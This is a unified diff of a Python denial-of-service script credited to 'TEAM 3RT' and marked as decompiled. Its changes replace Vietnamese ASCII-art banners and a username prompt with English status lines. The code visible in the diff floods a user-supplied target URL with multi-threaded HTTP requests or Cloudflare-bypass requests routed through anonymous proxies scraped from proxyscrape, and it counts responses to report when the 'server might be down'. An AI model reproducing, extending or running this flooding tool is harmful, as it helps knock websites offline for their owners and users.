@@ -1,42 +1,10 @@
-#Creator by SYNX3RT and PRAGON
-import os, sys, time, random, threading, urllib.request, colorama
-from colorama import *
-colorama.init(autoreset=True)
-
-user =''
-username=input(Fore.MAGENTA + '''
-                                                                                  
-UUUUUUUU     UUUUUUUU   SSSSSSSSSSSSSSS EEEEEEEEEEEEEEEEEEEEEERRRRRRRRRRRRRRRRR   
-U::::::U     U::::::U SS:::::::::::::::SE::::::::::::::::::::ER::::::::::::::::R  
-U::::::U     U::::::US:::::SSSSSS::::::SE::::::::::::::::::::ER::::::RRRRRR:::::R 
-UU:::::U     U:::::UUS:::::S     SSSSSSSEE::::::EEEEEEEEE::::ERR:::::R     R:::::R
- U:::::U     U:::::U S:::::S              E:::::E       EEEEEE  R::::R     R:::::R
- U:::::D     D:::::U S:::::S              E:::::E               R::::R     R:::::R
- U:::::D     D:::::U  S::::SSSS           E::::::EEEEEEEEEE     R::::RRRRRR:::::R 
- U:::::D     D:::::U   SS::::::SSSSS      E:::::::::::::::E     R:::::::::::::RR  
- U:::::D     D:::::U     SSS::::::::SS    E:::::::::::::::E     R::::RRRRRR:::::R 
- U:::::D     D:::::U        SSSSSS::::S   E::::::EEEEEEEEEE     R::::R     R:::::R
- U:::::D     D:::::U             S:::::S  E:::::E               R::::R     R:::::R
- U::::::U   U::::::U             S:::::S  E:::::E       EEEEEE  R::::R     R:::::R
- U:::::::UUU:::::::U SSSSSSS     S:::::SEE::::::EEEEEEEE:::::ERR:::::R     R:::::R
-  UU:::::::::::::UU  S::::::SSSSSS:::::SE::::::::::::::::::::ER::::::R     R:::::R
-    UU:::::::::UU    S:::::::::::::::SS E::::::::::::::::::::ER::::::R     R:::::R
-      UUUUUUUUU       SSSSSSSSSSSSSSS   EEEEEEEEEEEEEEEEEEEEEERRRRRRRR     RRRRRRR
-                              DEMO BY LTN                                                    
-    INPUT:''')
-if username == user:
-    print('chờ chút nhé')
-    os.system("clear")
-else:
-    print("sai user")
-    quit()
-
+#Decompile By 1x019 @ July 12 2022
+import os, sys, time, random, threading, urllib.request
 try:
     import requests, cfscrape, colorama, fake_useragent
     from colorama import *
     from fake_useragent import UserAgent
-    colorama.init(autoreset=True)
-    
+    colorama.init(Style.BRIGHT, Back.WHITE)
 except ImportError:
     print(Fore.YELLOW + '[-] No module name requests !!!')
     print(Fore.YELLOW + '[-] No module name cfscrape !!!')
@@ -59,7 +27,7 @@ except ImportError:
             os.system('sudo pip install cfscrape')
             os.system('sudo pip install colorama')
             os.system('sudo pip install fake-useragent')
-            
+
 else:
     in_proxies = []
     request_num = 0
@@ -1351,19 +1319,7 @@ else:
                 if self.choice == 'sock5':
                     scraper.proxies['sock5'] = {'sock5://': self.proxy}
                 cloudflare = scraper.get((self.url), timeout=None, data=None, headers=None)
-                print((Fore.RED + '''method BYPASSVIP %s -- %s -- %s
-                                                                                                                                                                  
-         .8.    8888888 8888888888   .8.           ,o888888o.    8 8888     ,88'   d888888o.   8 8888888888   b.             8 8888888 8888888888 
-        .888.         8 8888        .888.         8888     `88.  8 8888    ,88'  .`8888:' `88. 8 8888         888o.          8       8 8888       
-       :88888.        8 8888       :88888.     ,8 8888       `8. 8 8888   ,88'   8.`8888.   Y8 8 8888         Y88888o.       8       8 8888       
-      . `88888.       8 8888      . `88888.    88 8888           8 8888  ,88'    `8.`8888.     8 8888         .`Y888888o.    8       8 8888       
-     .8. `88888.      8 8888     .8. `88888.   88 8888           8 8888 ,88'      `8.`8888.    8 888888888888 8o. `Y888888o. 8       8 8888       
-    .8`8. `88888.     8 8888    .8`8. `88888.  88 8888           8 8888 88'        `8.`8888.   8 8888         8`Y8o. `Y88888o8       8 8888       
-   .8' `8. `88888.    8 8888   .8' `8. `88888. 88 8888           8 888888<          `8.`8888.  8 8888         8   `Y8o. `Y8888       8 8888       
-  .8'   `8. `88888.   8 8888  .8'   `8. `88888.`8 8888       .8' 8 8888 `Y8.    8b   `8.`8888. 8 8888         8      `Y8o. `Y8       8 8888       
- .888888888. `88888.  8 8888 .888888888. `88888.  8888     ,88'  8 8888   `Y8.  `8b.  ;8.`8888 8 8888         8         `Y8o.`       8 8888       
-.8'       `8. `88888. 8 8888.8'       `8. `88888.  `8888888P'    8 8888     `Y8. `Y8888P ,88P' 8 888888888888 8            `Yo       8 8888       
-''' % (self.num, request_num, cloudflare.status_code  )), end='')
+                print((Fore.GREEN + '[+] ByPass %s --CloudStatus: %s -- Done %s --Proxy--| %s ' % (request_num, cloudflare.status_code, self.num, self.proxy)), end='')
 
         def requestsHttpFlood(self):
             global request_num
@@ -1396,11 +1352,7 @@ else:
                 requestes.add_header('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8')
                 urllib.request.urlopen(requestes)
                 request_num += 1
-                print((Fore.RED + '''method HTTPVIP %s --  %s -- 
- _     _ _______ _______  _____  _______         _____   _____  ______  _______ _______ __   _ _______
- |_____|    |       |    |_____] |______ |      |     | |     | |     \ |______ |______ | \  |    |   
- |     |    |       |    |       |       |_____ |_____| |_____| |_____/ ______| |______ |  \_|    |   
-''' % (self.num, request_num, )), end='')
+                print((Fore.GREEN + '[+] HTTP Flood ==> Requests %s -- Done %s --Proxy--| %s ' % (request_num, self.num, self.proxy)), end='')
 
         def run(self):
             self.Lock.acquire()
@@ -1413,55 +1365,19 @@ else:
                         self.requestsCloudFlare()
                 except urllib.request.HTTPError as e:
                     try:
-                        print(Fore.CYAN + '''sập kìa bé %s\n
-8 888888888o.          ,o888888o.  `8.`888b                 ,8' b.             8 
-8 8888    `^888.    . 8888     `88. `8.`888b               ,8'  888o.          8 
-8 8888        `88. ,8 8888       `8b `8.`888b             ,8'   Y88888o.       8 
-8 8888         `88 88 8888        `8b `8.`888b     .b    ,8'    .`Y888888o.    8 
-8 8888          88 88 8888         88  `8.`888b    88b  ,8'     8o. `Y888888o. 8 
-8 8888          88 88 8888         88   `8.`888b .`888b,8'      8`Y8o. `Y88888o8 
-8 8888         ,88 88 8888        ,8P    `8.`888b8.`8888'       8   `Y8o. `Y8888 
-8 8888        ,88' `8 8888       ,8P      `8.`888`8.`88'        8      `Y8o. `Y8 
-8 8888    ,o88P'    ` 8888     ,88'        `8.`8' `8,`'         8         `Y8o.` 
-8 888888888P'          `8888888P'           `8.`   `8'          8            `Yo 
-
-''' % e)
+                        print(Fore.CYAN + '[+] SERVER MIGHT BE DOWN !!! Status Response is : %s\n' % e)
                     finally:
                         e = None
                         del e
 
                 except urllib.request.URLError:
-                    print(Fore.RED + '''
- ******** *******   *******     *******   *******  
-/**///// /**////** /**////**   **/////** /**////** 
-/**      /**   /** /**   /**  **     //**/**   /** 
-/******* /*******  /*******  /**      /**/*******  
-/**////  /**///**  /**///**  /**      /**/**///**  
-/**      /**  //** /**  //** //**     ** /**  //** 
-/********/**   //**/**   //** //*******  /**   //**
-//////// //     // //     //   ///////   //     // 
-                    \n''')
+                    print(Fore.RED + '[+] URL ERROR , Checking Url !!!\n')
                 except ValueError:
-                    print(Fore.RED + '''
- ******** *******   *******     *******   *******  
-/**///// /**////** /**////**   **/////** /**////** 
-/**      /**   /** /**   /**  **     //**/**   /** 
-/******* /*******  /*******  /**      /**/*******  
-/**////  /**///**  /**///**  /**      /**/**///**  
-/**      /**  //** /**  //** //**     ** /**  //** 
-/********/**   //**/**   //** //*******  /**   //**
-//////// //     // //     //   ///////   //     // 
-                    \n''')
+                    print(Fore.RED + '[+]Checking The URL or Something ERROR !!!\n')
                 except KeyboardInterrupt:
-                    exit(Fore.RED + ' By SINX3RT !!!')
+                    exit(Fore.RED + '[-]Canceled By P3terJ4mes !!!')
                 except Exception:
-                    sys.stdout.write(Fore.RED + '''
-_|_|_|    _|_|_|      _|_|    _|      _|  _|_|_|  _|_|_|_|    _|_|_|  _|_|_|    _|_|_|  _|_|_|_|  
-_|    _|  _|    _|  _|    _|    _|  _|      _|    _|        _|        _|    _|    _|    _|        
-_|_|_|    _|_|_|    _|    _|      _|        _|    _|_|_|      _|_|    _|    _|    _|    _|_|_|    
-_|        _|    _|  _|    _|    _|  _|      _|    _|              _|  _|    _|    _|    _|        
-_|        _|    _|    _|_|    _|      _|  _|_|_|  _|_|_|_|  _|_|_|    _|_|_|    _|_|_|  _|_|_|_|  
-                    \n''')
+                    sys.stdout.write(Fore.RED + '[+] The Host May Be DIE or Proxy DEAD !!!\n')
 
 
     class MainLoop:
@@ -1469,89 +1385,19 @@ _|        _|    _|    _|_|    _|      _|  _|_|_|  _|_|_|_|  _|_|_|    _|_|_|    
         def home(self):
             global Flood_Mode
             global in_proxies
-            print(Fore.RED + '''
-  _|_|_|  _|      _|  _|      _|  _|      _|  _|_|_|    _|_|_|    _|_|_|_|_|  
-_|          _|  _|    _|_|    _|    _|  _|          _|  _|    _|      _|      
-  _|_|        _|      _|  _|  _|      _|        _|_|    _|_|_|        _|      
-      _|      _|      _|    _|_|    _|  _|          _|  _|    _|      _|      
-_|_|_|        _|      _|      _|  _|      _|  _|_|_|    _|    _|      _|      
-                                                                              
-        
-          DDOS PYTHON BY TEAM 3RT
-''')
-            go="run"
-            gorun=input(Fore.RED + '=>>')
-            if gorun == go:
-                print('START')
-                os.system('clear')
-            else:
-                print('sai lệnh')
-                quit()
-
+            print(Fore.YELLOW + "  \n            \n         ___                              _   _  ____   ____ \n          | | / _` || '_ \\  / _` || '_ \\ | | | |   \\ \\ |  /||   HttpTools\n       /\\_/ || (_| || |_) || (_| || | | | \\ \\/ /.__/ /_\\ |/ /Use Proxy Live\n       \\___/  \\__,_|| .__/  \\__,_||_| |_|  \\__/ \\___/(_)\\__/ \n                    | |                                         \n                    |_|  High Anonymous Http/Https/Sock4/Sock5             \n       \n  +--------------------------------------------------------------------------+               \n  == >> Method: Http Flood - Bypass Cloud Flare - Auto Get/Update Proxy << ===\n  ")
             if os.name in ('nt', 'dos', 'ce'):
                 os.system('title       ...')
-
             try:
-                url = input(Fore.MAGENTA + '''
-8 8888      88 8 888888888o.   8 8888         
-8 8888      88 8 8888    `88.  8 8888         
-8 8888      88 8 8888     `88  8 8888         
-8 8888      88 8 8888     ,88  8 8888         
-8 8888      88 8 8888.   ,88'  8 8888         
-8 8888      88 8 888888888P'   8 8888         
-8 8888      88 8 8888`8b       8 8888         
-` 8888     ,8P 8 8888 `8b.     8 8888         
-  8888   ,d8P  8 8888   `8b.   8 8888         
-   `Y88888P'   8 8888     `88. 8 888888888888 
-
-                Target: ''')
-                num_threads = int(727)
+                url = input('[*] Target [https://domain.com]: ')
+                num_threads = int(550)
                 choice = 'high anonymous http/https/sock4/sock5'
-                os.system('clear')
-                mode = input(Fore.BLUE + '''
-MMMMMMMM               MMMMMMMMEEEEEEEEEEEEEEEEEEEEEETTTTTTTTTTTTTTTTTTTTTTTHHHHHHHHH     HHHHHHHHH     OOOOOOOOO     DDDDDDDDDDDDD        
-M:::::::M             M:::::::ME::::::::::::::::::::ET:::::::::::::::::::::TH:::::::H     H:::::::H   OO:::::::::OO   D::::::::::::DDD     
-M::::::::M           M::::::::ME::::::::::::::::::::ET:::::::::::::::::::::TH:::::::H     H:::::::H OO:::::::::::::OO D:::::::::::::::DD   
-M:::::::::M         M:::::::::MEE::::::EEEEEEEEE::::ET:::::TT:::::::TT:::::THH::::::H     H::::::HHO:::::::OOO:::::::ODDD:::::DDDDD:::::D  
-M::::::::::M       M::::::::::M  E:::::E       EEEEEETTTTTT  T:::::T  TTTTTT  H:::::H     H:::::H  O::::::O   O::::::O  D:::::D    D:::::D 
-M:::::::::::M     M:::::::::::M  E:::::E                     T:::::T          H:::::H     H:::::H  O:::::O     O:::::O  D:::::D     D:::::D
-M:::::::M::::M   M::::M:::::::M  E::::::EEEEEEEEEE           T:::::T          H::::::HHHHH::::::H  O:::::O     O:::::O  D:::::D     D:::::D
-M::::::M M::::M M::::M M::::::M  E:::::::::::::::E           T:::::T          H:::::::::::::::::H  O:::::O     O:::::O  D:::::D     D:::::D
-M::::::M  M::::M::::M  M::::::M  E:::::::::::::::E           T:::::T          H:::::::::::::::::H  O:::::O     O:::::O  D:::::D     D:::::D
-M::::::M   M:::::::M   M::::::M  E::::::EEEEEEEEEE           T:::::T          H::::::HHHHH::::::H  O:::::O     O:::::O  D:::::D     D:::::D
-M::::::M    M:::::M    M::::::M  E:::::E                     T:::::T          H:::::H     H:::::H  O:::::O     O:::::O  D:::::D     D:::::D
-M::::::M     MMMMM     M::::::M  E:::::E       EEEEEE        T:::::T          H:::::H     H:::::H  O::::::O   O::::::O  D:::::D    D:::::D 
-M::::::M               M::::::MEE::::::EEEEEEEE:::::E      TT:::::::TT      HH::::::H     H::::::HHO:::::::OOO:::::::ODDD:::::DDDDD:::::D  
-M::::::M               M::::::ME::::::::::::::::::::E      T:::::::::T      H:::::::H     H:::::::H OO:::::::::::::OO D:::::::::::::::DD   
-M::::::M               M::::::ME::::::::::::::::::::E      T:::::::::T      H:::::::H     H:::::::H   OO:::::::::OO   D::::::::::::DDD     
-MMMMMMMM               MMMMMMMMEEEEEEEEEEEEEEEEEEEEEE      TTTTTTTTTTT      HHHHHHHHH     HHHHHHHHH     OOOOOOOOO     DDDDDDDDDDDDD        
-                                Choice HTTP or CFB
-                Input: ''')
-                os.system('clear')
-                Flood_Mode = mode == 'HTTP' or True
-                if mode == 'CFB' or None:
+                mode = input('[+] Methods HttpFlood[Y]/ CloudFlare[]: ')
+                Flood_Mode = mode == 'Y' or True
+                if mode == '' or None:
                     Flood_Mode = False
                 while choice == 'high anonymous http/https/sock4/sock5':
-                    choice = str(input(Fore.CYAN + '''
-PPPPPPPPPPPPPPPPP   RRRRRRRRRRRRRRRRR        OOOOOOOOO     XXXXXXX       XXXXXXXIIIIIIIIIIEEEEEEEEEEEEEEEEEEEEEE   SSSSSSSSSSSSSSS 
-P::::::::::::::::P  R::::::::::::::::R     OO:::::::::OO   X:::::X       X:::::XI::::::::IE::::::::::::::::::::E SS:::::::::::::::S
-P::::::PPPPPP:::::P R::::::RRRRRR:::::R  OO:::::::::::::OO X:::::X       X:::::XI::::::::IE::::::::::::::::::::ES:::::SSSSSS::::::S
-PP:::::P     P:::::PRR:::::R     R:::::RO:::::::OOO:::::::OX::::::X     X::::::XII::::::IIEE::::::EEEEEEEEE::::ES:::::S     SSSSSSS
-  P::::P     P:::::P  R::::R     R:::::RO::::::O   O::::::OXXX:::::X   X:::::XXX  I::::I    E:::::E       EEEEEES:::::S            
-  P::::P     P:::::P  R::::R     R:::::RO:::::O     O:::::O   X:::::X X:::::X     I::::I    E:::::E             S:::::S            
-  P::::PPPPPP:::::P   R::::RRRRRR:::::R O:::::O     O:::::O    X:::::X:::::X      I::::I    E::::::EEEEEEEEEE    S::::SSSS         
-  P:::::::::::::PP    R:::::::::::::RR  O:::::O     O:::::O     X:::::::::X       I::::I    E:::::::::::::::E     SS::::::SSSSS    
-  P::::PPPPPPPPP      R::::RRRRRR:::::R O:::::O     O:::::O     X:::::::::X       I::::I    E:::::::::::::::E       SSS::::::::SS  
-  P::::P              R::::R     R:::::RO:::::O     O:::::O    X:::::X:::::X      I::::I    E::::::EEEEEEEEEE          SSSSSS::::S 
-  P::::P              R::::R     R:::::RO:::::O     O:::::O   X:::::X X:::::X     I::::I    E:::::E                         S:::::S
-  P::::P              R::::R     R:::::RO::::::O   O::::::OXXX:::::X   X:::::XXX  I::::I    E:::::E       EEEEEE            S:::::S
-PP::::::PP          RR:::::R     R:::::RO:::::::OOO:::::::OX::::::X     X::::::XII::::::IIEE::::::EEEEEEEE:::::ESSSSSSS     S:::::S
-P::::::::P          R::::::R     R:::::R OO:::::::::::::OO X:::::X       X:::::XI::::::::IE::::::::::::::::::::ES::::::SSSSSS:::::S
-P::::::::P          R::::::R     R:::::R   OO:::::::::OO   X:::::X       X:::::XI::::::::IE::::::::::::::::::::ES:::::::::::::::SS 
-PPPPPPPPPP          RRRRRRRR     RRRRRRR     OOOOOOOOO     XXXXXXX       XXXXXXXIIIIIIIIIIEEEEEEEEEEEEEEEEEEEEEE SSSSSSSSSSSSSSS   
-                              Choice: http https sock4 sock5 
-             Type:        ''')).strip()
-                    os.system('clear')
+                    choice = str(input('[*] Type Proxy[http/https/sock4/sock5]: ')).strip()
                     if choice == 'http':
                         proxy_http = open('http.txt', 'wb')
                         r = requests.get('https://api.proxyscrape.com?request=getproxies&proxytype=http&anonymity=elite')
@@ -1561,15 +1407,7 @@ PPPPPPPPPP          RRRRRRRR     RRRRRRR     OOOOOOOOO     XXXXXXX       XXXXXXX
                         proxy_http.close()
                         out_proxies = str('http.txt')
                         proxies_http = open(out_proxies).readlines()
-                        print(Fore.YELLOW + ''' 
- _      _______      ________ 
-| |    |_   _\ \    / /  ____|
-| |      | |  \ \  / /| |__   
-| |      | |   \ \/ / |  __|  
-| |____ _| |_   \  /  | |____ 
-|______|_____|   \/   |______|
-
-            :%s                  ''' % len(proxies_http))
+                        print(Fore.YELLOW + '[+] Number Of Http Proxies: %s Live High Anonymous.' % len(proxies_http))
                         in_proxies = open('http.txt', 'r')
                     if choice == 'https':
                         proxy_https = open('https.txt', 'wb')
@@ -1580,14 +1418,7 @@ PPPPPPPPPP          RRRRRRRR     RRRRRRR     OOOOOOOOO     XXXXXXX       XXXXXXX
                         proxy_https.close()
                         out_proxies = str('https.txt')
                         proxies_https = open(out_proxies).readlines()
-                        print(Fore.YELLOW + '''
- _      _______      ________ 
-| |    |_   _\ \    / /  ____|
-| |      | |  \ \  / /| |__   
-| |      | |   \ \/ / |  __|  
-| |____ _| |_   \  /  | |____ 
-|______|_____|   \/   |______|
-                Live: %s        ''' % len(proxies_https))
+                        print(Fore.YELLOW + '[+] Number Of Https Proxies: %s Live High Anonymous.' % len(proxies_https))
                         in_proxies = open('https.txt', 'r')
                     if choice == 'sock4':
                         socks4 = open('socks4.txt', 'wb')
@@ -1598,14 +1429,7 @@ PPPPPPPPPP          RRRRRRRR     RRRRRRR     OOOOOOOOO     XXXXXXX       XXXXXXX
                         socks4.close()
                         out_socks4 = str('socks4.txt')
                         proxies_socks4 = open(out_socks4).readlines()
-                        print(Fore.YELLOW + '''
- _      _______      ________ 
-| |    |_   _\ \    / /  ____|
-| |      | |  \ \  / /| |__   
-| |      | |   \ \/ / |  __|  
-| |____ _| |_   \  /  | |____ 
-|______|_____|   \/   |______|
-              %s          ''' % len(proxies_socks4))
+                        print(Fore.YELLOW + '[+] Number Of Socks4 Proxies: %s Live High Anonymous.' % len(proxies_socks4))
                         in_proxies = open('socks4.txt', 'r')
                     if choice == 'sock5':
                         socks5 = open('socks5.txt', 'wb')
@@ -1616,14 +1440,7 @@ PPPPPPPPPP          RRRRRRRR     RRRRRRR     OOOOOOOOO     XXXXXXX       XXXXXXX
                         socks5.close()
                         out_socks5 = str('socks5.txt')
                         proxies_socks5 = open(out_socks5).readlines()
-                        print(Fore.YELLOW + ''' 
- _      _______      ________ 
-| |    |_   _\ \    / /  ____|
-| |      | |  \ \  / /| |__   
-| |      | |   \ \/ / |  __|  
-| |____ _| |_   \  /  | |____ 
-|______|_____|   \/   |______|
-           %s :            ''' % len(proxies_socks5))
+                        print(Fore.YELLOW + '[+] Number Of Socks5 Proxies: %s Live High Anonymous. ' % len(proxies_socks5))
                         in_proxies = open('socks5.txt', 'r')
 
             except:
@@ -1635,7 +1452,7 @@ PPPPPPPPPP          RRRRRRRR     RRRRRRR     OOOOOOOOO     XXXXXXX       XXXXXXX
                         Requests(url, i + 1, in_line, choice, mode).start()
                         in_line = in_line[:-1]
                     except Exception:
-                        print(Fore.YELLOW + "Không thể kết nối với Url hãy kiểm tra lại PLS")
+                        print(Fore.YELLOW + "[-] Can't connect The Url or Choice error ,Check again !!!")
                         time.sleep(10)
 
 
